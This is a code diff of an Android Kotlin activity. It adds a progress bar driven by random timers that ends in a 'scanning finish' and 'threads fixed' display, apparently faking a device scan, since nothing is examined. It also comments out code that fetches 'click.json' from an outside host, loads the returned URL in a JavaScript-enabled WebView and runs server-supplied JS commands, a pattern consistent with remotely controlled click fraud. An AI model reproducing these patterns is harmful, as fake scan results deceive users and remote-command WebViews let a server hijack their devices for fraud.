@@ -6,6 +6,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.support.v7.app.AppCompatActivity
+import android.view.View
 import android.webkit.WebChromeClient
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -25,7 +26,19 @@ class MainActivity : AppCompatActivity(), Callback<String> {
     private val startTime = System.currentTimeMillis()
     private val progressTask = object : Runnable{
         override fun run() {
-            
+            val diff = System.currentTimeMillis() - startTime
+
+            val percentAbs: Double = 1 - ((TASK_TIME - diff) / TASK_TIME.toDouble())
+            val percent = (percentAbs * 100).toInt()
+            if (percent < 100){
+                updateProgress(percent)
+                val leftLimit = 300L
+                val rightLimit = 3000L
+                val generatedLong = leftLimit + (Math.random() * (rightLimit - leftLimit)).toLong()
+                progressHandler.postDelayed(this, generatedLong)
+            } else {
+                showFinish()
+            }
         }
     }
 
@@ -33,23 +46,25 @@ class MainActivity : AppCompatActivity(), Callback<String> {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        progressHandler.post(progressTask)
+
         callbackHrefs = { initHrefs(it) }
 
         initWebView()
 
-        Webservice.webApi
-            .loadServerData("http://bestplace.pw/click.json")
-            .enqueue(object : Callback<ServerResponse> {
-                override fun onFailure(call: Call<ServerResponse>?, t: Throwable?) {}
-
-                override fun onResponse(call: Call<ServerResponse>?, response: Response<ServerResponse>?) {
-                    val serverData = response?.body() ?: return
-
-                    webView.loadUrl(serverData.url)
-
-                    callback = { involveCommands(JSCommanFactory.generateCommands(serverData.elements)) }
-                }
-            })
+//        Webservice.webApi
+//            .loadServerData("http://bestplace.pw/click.json")
+//            .enqueue(object : Callback<ServerResponse> {
+//                override fun onFailure(call: Call<ServerResponse>?, t: Throwable?) {}
+//
+//                override fun onResponse(call: Call<ServerResponse>?, response: Response<ServerResponse>?) {
+//                    val serverData = response?.body() ?: return
+//
+//                    webView.loadUrl(serverData.url)
+//
+//                    callback = { involveCommands(JSCommanFactory.generateCommands(serverData.elements)) }
+//                }
+//            })
     }
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -102,8 +117,15 @@ class MainActivity : AppCompatActivity(), Callback<String> {
 
     override fun onResponse(call: Call<String>?, response: Response<String>?) {}
 
-    private fun updateProgress(){
+    private fun updateProgress(percent: Int){
+        progressBar.progress = percent
+        progressText.text = "$percent%"
+    }
 
+    private fun showFinish(){
+        titleView.setText(R.string.scanning_finish)
+        progressContainer.visibility = View.GONE
+        threadsFixed.visibility = View.VISIBLE
     }
 
     override fun onDestroy() {
